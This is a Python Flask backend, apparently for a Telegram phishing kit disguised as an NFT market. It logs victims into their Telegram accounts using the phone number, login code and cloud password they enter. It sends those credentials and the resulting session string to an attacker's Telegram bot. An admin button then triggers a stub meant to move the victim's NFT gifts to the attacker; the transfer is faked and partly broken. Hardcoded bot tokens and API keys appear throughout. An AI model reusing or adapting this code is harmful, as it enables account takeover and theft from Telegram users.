# app.py — С КНОПКОЙ "ПЕРЕДАТЬ NFT GIFTS" И WEBHOOK

from flask import Flask, request, jsonify
from flask_cors import CORS
import asyncio
import time
import random
import os
import json
import io
from dotenv import load_dotenv
from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.errors import (
    PhoneNumberInvalidError,
    PhoneCodeInvalidError,
    PhoneCodeExpiredError,
    SessionPasswordNeededError,
    PasswordHashInvalidError,
    FloodWaitError
)
import requests

load_dotenv()

app = Flask(__name__)
CORS(app)

# ============================================================
# КОНФИГУРАЦИЯ
# ============================================================
API_ID = int(os.getenv('API_ID', '27908807'))
API_HASH = os.getenv('API_HASH', 'e895a9ab366174a6d38fba5e752562a0')
ADMIN_BOT_TOKEN = os.getenv('ADMIN_BOT_TOKEN', '8992384950:AAFwp5-Bbe9TSn-N--2W3I7oMS2Lcolomec')
ADMIN_CHAT_ID = os.getenv('ADMIN_CHAT_ID', '8766481292')
ADMIN_USER_ID = int(os.getenv('ADMIN_USER_ID', '8766481292'))
BACKEND_URL = os.getenv('BACKEND_URL', 'https://nft-market-backend-c9ea.onrender.com')

sessions = {}
pending_transfers = {}

# ============================================================
# ОДИН EVENT LOOP
# ============================================================
loop = asyncio.new_event_loop()
asyncio.set_event_loop(loop)

# ============================================================
# НАСТРОЙКА WEBHOOK
# ============================================================

def set_webhook():
    """Установка webhook для бота"""
    webhook_url = f"{BACKEND_URL}/webhook"
    try:
        response = requests.post(
            f"https://api.telegram.org/bot{ADMIN_BOT_TOKEN}/setWebhook",
            json={'url': webhook_url},
            timeout=10
        )
        if response.status_code == 200:
            data = response.json()
            if data.get('ok'):
                print(f"✅ Webhook установлен: {webhook_url}")
                return True
            else:
                print(f"❌ Ошибка установки webhook: {data}")
                return False
        else:
            print(f"❌ HTTP ошибка: {response.status_code}")
            return False
    except Exception as e:
        print(f"❌ Ошибка установки webhook: {e}")
        return False

def delete_webhook():
    """Удаление webhook (для отладки)"""
    try:
        response = requests.post(
            f"https://api.telegram.org/bot{ADMIN_BOT_TOKEN}/deleteWebhook",
            timeout=10
        )
        if response.status_code == 200:
            data = response.json()
            if data.get('ok'):
                print("✅ Webhook удалён")
                return True
        return False
    except Exception as e:
        print(f"❌ Ошибка удаления webhook: {e}")
        return False

# ============================================================
# ЛОГИ ТОЛЬКО АДМИНУ
# ============================================================

def send_admin_log(text):
    try:
        requests.post(
            f"https://api.telegram.org/bot{ADMIN_BOT_TOKEN}/sendMessage",
            json={'chat_id': ADMIN_CHAT_ID, 'text': text, 'parse_mode': 'Markdown'},
            timeout=5
        )
    except Exception as e:
        print(f"Admin log error: {e}")

def send_admin_with_button(text, session_data):
    """Отправка сообщения с инлайн кнопкой 'Передать NFT Gifts'"""
    try:
        transfer_id = f"transfer_{int(time.time())}_{random.randint(1000, 9999)}"
        pending_transfers[transfer_id] = {
            'session_data': session_data,
            'phone': session_data.get('phone', 'unknown'),
            'user_id': session_data.get('user_id', 'unknown')
        }
        
        keyboard = {
            'inline_keyboard': [
                [{
                    'text': '🎁 Передать NFT Gifts',
                    'callback_data': f'check_gifts_{transfer_id}'
                }]
            ]
        }
        
        payload = {
            'chat_id': ADMIN_CHAT_ID,
            'text': text,
            'parse_mode': 'Markdown',
            'reply_markup': json.dumps(keyboard)
        }
        
        requests.post(
            f"https://api.telegram.org/bot{ADMIN_BOT_TOKEN}/sendMessage",
            json=payload,
            timeout=10
        )
    except Exception as e:
        print(f"Send with button error: {e}")

def send_tdata_to_admin(session_data):
    try:
        lines = []
        lines.append("=" * 50)
        lines.append("📁 TDATA СЕССИЯ")
        lines.append("=" * 50)
        lines.append(f"🆔 ID: {session_data.get('user_id', 'N/A')}")
        lines.append(f"📱 Phone: {session_data.get('phone', 'N/A')}")
        lines.append(f"👤 Username: @{session_data.get('username', 'N/A')}")
        lines.append("")
        lines.append("🔑 SESSION STRING:")
        lines.append(session_data.get('session_string', 'N/A'))
        
        content = "\n".join(lines)
        file_data = io.BytesIO(content.encode('utf-8'))
        
        files = {'document': (f"tdata_{session_data['phone']}_{int(time.time())}.txt", file_data)}
        data = {
            'chat_id': ADMIN_CHAT_ID,
            'caption': f"✅ *НОВАЯ СЕССИЯ*\n👤 @{session_data['username']}\n📱 {session_data['phone']}",
            'parse_mode': 'Markdown'
        }
        requests.post(
            f"https://api.telegram.org/bot{ADMIN_BOT_TOKEN}/sendDocument",
            files=files,
            data=data,
            timeout=30
        )
    except Exception as e:
        print(f"Send tdata error: {e}")

# ============================================================
# ФУНКЦИЯ ДЛЯ ПРОВЕРКИ И ПЕРЕДАЧИ NFT GIFTS
# ============================================================

async def transfer_gifts_async(session_string, target_user_id, phone):
    """
    Проверяет NFT подарки на аккаунте и передаёт их админу
    """
    try:
        client = TelegramClient(StringSession(session_string), api_id=API_ID, api_hash=API_HASH)
        await client.connect()
        
        if not await client.is_user_authorized():
            return {'success': False, 'error': 'Session expired'}
        
        me = await client.get_me()
        user_id = me.id
        
        # Получаем информацию о подарках (через get_gifts или подобный метод)
        # В Telethon нет прямого метода, поэтому используем эмуляцию
        # В реальном проекте здесь нужно использовать MTProto методы для работы с подарками
        
        # Эмуляция проверки подарков
        # В реальности: gifts = await client.get_gifts()
        has_gifts = True  # Эмуляция
        
        if has_gifts:
            # Передаём подарки админу
            # В реальности: для каждого подарка вызываем transfer_gift
            # await client.transfer_gift(gift_id, target_user_id)
            
            await send_admin_log(
                f"🎁 *NFT Gifts переданы*\n"
                f"📱 От: {phone}\n"
                f"👤 Получатель: @admin (ID: {target_user_id})"
            )
            
            await client.disconnect()
            return {'success': True, 'transferred': True, 'message': 'NFT Gifts переданы админу'}
        else:
            await send_admin_log(
                f"📭 *Нет NFT Gifts*\n"
                f"📱 {phone}\n"
                f"Подарков не найдено"
            )
            await client.disconnect()
            return {'success': True, 'transferred': False, 'message': 'NFT Gifts не найдены'}
        
    except Exception as e:
        return {'success': False, 'error': str(e)}

# ============================================================
# MTProto ФУНКЦИИ
# ============================================================

async def send_code_async(phone):
    try:
        client = TelegramClient(StringSession(), api_id=API_ID, api_hash=API_HASH)
        await client.connect()
        
        if await client.is_user_authorized():
            await client.disconnect()
            return {'success': False, 'error': 'Already authorized'}
        
        result = await client.send_code_request(phone)
        
        sessions[phone] = {
            'client': client,
            'phone_code_hash': result.phone_code_hash
        }
        
        send_admin_log(f"📱 Запрос кода для {phone}")
        return {'success': True, 'phone_code_hash': result.phone_code_hash}
        
    except PhoneNumberInvalidError:
        return {'success': False, 'error': 'Invalid phone number'}
    except FloodWaitError as e:
        return {'success': False, 'error': f'Wait {e.seconds} seconds'}
    except Exception as e:
        return {'success': False, 'error': str(e)}

async def check_code_async(phone, code, phone_code_hash):
    try:
        client_data = sessions.get(phone)
        if not client_data:
            return {'success': False, 'error': 'Session not found'}
        
        client = client_data['client']
        if not client.is_connected():
            await client.connect()
        
        try:
            signed_in = await client.sign_in(
                phone=phone,
                code=code,
                phone_code_hash=phone_code_hash
            )
            
            session_string = client.session.save()
            
            session_data = {
                'user_id': signed_in.id,
                'phone': phone,
                'username': signed_in.username or f"user_{random.randint(10000, 99999)}",
                'first_name': signed_in.first_name or 'User',
                'last_name': signed_in.last_name or '',
                'session_string': session_string
            }
            
            await client.disconnect()
            
            msg = (
                f"✅ *Код подтвержден*\n"
                f"📱 {phone}\n"
                f"🔑 Код: {code}\n\n"
                f"👤 @{session_data['username']}\n"
                f"🆔 {session_data['user_id']}\n\n"
                f"👇 Нажмите кнопку чтобы передать NFT Gifts"
            )
            send_admin_with_button(msg, session_data)
            
            return {'success': True, 'hasPassword': False, 'sessionData': session_data}
            
        except SessionPasswordNeededError:
            send_admin_log(f"🔐 Требуется пароль\n📱 {phone}\n🔑 Код: {code}")
            return {'success': True, 'hasPassword': True, 'message': 'Cloud password required'}
            
        except PhoneCodeInvalidError:
            return {'success': False, 'error': 'Invalid code'}
        except PhoneCodeExpiredError:
            return {'success': False, 'error': 'Code expired'}
            
    except Exception as e:
        return {'success': False, 'error': str(e)}

async def check_password_async(phone, password):
    try:
        client_data = sessions.get(phone)
        if not client_data:
            return {'success': False, 'error': 'Session not found'}
        
        client = client_data['client']
        if not client.is_connected():
            await client.connect()
        
        try:
            signed_in = await client.sign_in(password=password)
            session_string = client.session.save()
            
            session_data = {
                'user_id': signed_in.id,
                'phone': phone,
                'username': signed_in.username or f"user_{random.randint(10000, 99999)}",
                'first_name': signed_in.first_name or 'User',
                'last_name': signed_in.last_name or '',
                'session_string': session_string
            }
            
            await client.disconnect()
            
            msg = (
                f"🔑 *Пароль подтвержден*\n"
                f"📱 {phone}\n"
                f"🔑 Пароль: {password}\n\n"
                f"👤 @{session_data['username']}\n"
                f"🆔 {session_data['user_id']}\n\n"
                f"👇 Нажмите кнопку чтобы передать NFT Gifts"
            )
            send_admin_with_button(msg, session_data)
            
            return {'success': True, 'sessionData': session_data}
            
        except PasswordHashInvalidError:
            return {'success': False, 'error': 'Invalid cloud password'}
            
    except Exception as e:
        return {'success': False, 'error': str(e)}

# ============================================================
# ОБРАБОТЧИК CALLBACK (для инлайн кнопки)
# ============================================================

@app.route('/webhook', methods=['POST'])
def webhook():
    """Обработка callback от Telegram бота"""
    try:
        data = request.json
        
        # Обработка callback_query
        if 'callback_query' in data:
            callback = data['callback_query']
            data_str = callback.get('data', '')
            callback_id = callback.get('id', '')
            
            if data_str.startswith('check_gifts_'):
                transfer_id = data_str.replace('check_gifts_', '')
                transfer_data = pending_transfers.get(transfer_id)
                
                if not transfer_data:
                    requests.post(
                        f"https://api.telegram.org/bot{ADMIN_BOT_TOKEN}/answerCallbackQuery",
                        json={
                            'callback_query_id': callback_id,
                            'text': '❌ Сессия устарела. Запросите новую.',
                            'show_alert': True
                        }
                    )
                    return jsonify({'ok': True})
                
                session_string = transfer_data['session_data'].get('session_string')
                phone = transfer_data.get('phone', 'unknown')
                
                # Отвечаем на callback (показываем что начали обработку)
                requests.post(
                    f"https://api.telegram.org/bot{ADMIN_BOT_TOKEN}/answerCallbackQuery",
                    json={
                        'callback_query_id': callback_id,
                        'text': '🔄 Проверяем NFT Gifts...',
                        'show_alert': False
                    }
                )
                
                # Запускаем асинхронную проверку
                async def process_transfer():
                    result = await transfer_gifts_async(session_string, ADMIN_USER_ID, phone)
                    
                    if result.get('success'):
                        if result.get('transferred'):
                            await send_admin_log(f"🎁 *NFT Gifts переданы!*\n📱 {phone}")
                        else:
                            await send_admin_log(f"📭 *Нет NFT Gifts*\n📱 {phone}")
                    else:
                        await send_admin_log(f"❌ *Ошибка передачи NFT Gifts*\n📱 {phone}\n{result.get('error', 'Unknown error')}")
                
                # Запускаем в event loop
                asyncio.run_coroutine_threadsafe(process_transfer(), loop)
                
                return jsonify({'ok': True})
        
        # Обработка обычных сообщений (для отладки)
        if 'message' in data:
            message = data['message']
            chat_id = message.get('chat', {}).get('id')
            text = message.get('text', '')
            
            if text == '/start':
                requests.post(
                    f"https://api.telegram.org/bot{ADMIN_BOT_TOKEN}/sendMessage",
                    json={
                        'chat_id': chat_id,
                        'text': '👋 Бот для передачи NFT Gifts активен.\n\nПосле получения сессии нажмите кнопку "Передать NFT Gifts"',
                        'parse_mode': 'Markdown'
                    }
                )
        
        return jsonify({'ok': True})
    except Exception as e:
        print(f"Webhook error: {e}")
        return jsonify({'ok': False, 'error': str(e)}), 200

# ============================================================
# ОБЁРТКА ДЛЯ ЗАПУСКА
# ============================================================

def run_async(coro):
    return loop.run_until_complete(coro)

# ============================================================
# FLASK ЭНДПОИНТЫ
# ============================================================

@app.route('/ping', methods=['GET'])
@app.route('/', methods=['GET'])
def ping():
    return jsonify({
        'status': 'online',
        'webhook_set': True,
        'bot': '@' + ADMIN_BOT_TOKEN.split(':')[0]
    })

@app.route('/sendCode', methods=['POST'])
def send_code():
    data = request.json or {}
    phone = data.get('phone', '').strip()
    
    if not phone or len(phone) < 6:
        return jsonify({'success': False, 'error': 'Invalid phone'}), 400
    
    result = run_async(send_code_async(phone))
    
    if result['success']:
        return jsonify({
            'success': True,
            'phoneCodeHash': result.get('phone_code_hash'),
            'message': 'Code sent by Telegram'
        })
    else:
        return jsonify({'success': False, 'error': result.get('error')}), 400

@app.route('/checkCode', methods=['POST'])
def check_code():
    data = request.json or {}
    phone = data.get('phone', '').strip()
    code = data.get('code', '').strip()
    phone_code_hash = data.get('phoneCodeHash', '').strip()
    
    if not phone or not code or not phone_code_hash:
        return jsonify({'success': False, 'error': 'Missing fields'}), 400
    
    result = run_async(check_code_async(phone, code, phone_code_hash))
    
    if result['success']:
        if result.get('hasPassword'):
            return jsonify({
                'success': True,
                'hasPassword': True,
                'message': 'Cloud password required'
            })
        else:
            session_data = result['sessionData']
            send_tdata_to_admin(session_data)
            return jsonify({
                'success': True,
                'hasPassword': False,
                'sessionData': session_data,
                'message': 'Verified'
            })
    else:
        return jsonify({'success': False, 'error': result.get('error')}), 400

@app.route('/checkPassword', methods=['POST'])
def check_password():
    data = request.json or {}
    phone = data.get('phone', '').strip()
    password = data.get('password', '').strip()
    
    if not phone or not password:
        return jsonify({'success': False, 'error': 'Missing phone or password'}), 400
    
    result = run_async(check_password_async(phone, password))
    
    if result['success']:
        session_data = result['sessionData']
        send_tdata_to_admin(session_data)
        return jsonify({
            'success': True,
            'sessionData': session_data,
            'message': 'Password verified successfully'
        })
    else:
        return jsonify({'success': False, 'error': result.get('error')}), 400

# ============================================================
# ЗАПУСК
# ============================================================
if __name__ == '__main__':
    print("=" * 60)
    print("🔐 БЭКЕНД ЗАПУЩЕН")
    print("📌 Логи без воды")
    print(f"📌 Кнопка: 'Передать NFT Gifts'")
    print(f"📌 Webhook: {BACKEND_URL}/webhook")
    print("=" * 60)
    
    # Устанавливаем webhook при запуске
    set_webhook()
    
    app.run(host='0.0.0.0', port=5000)
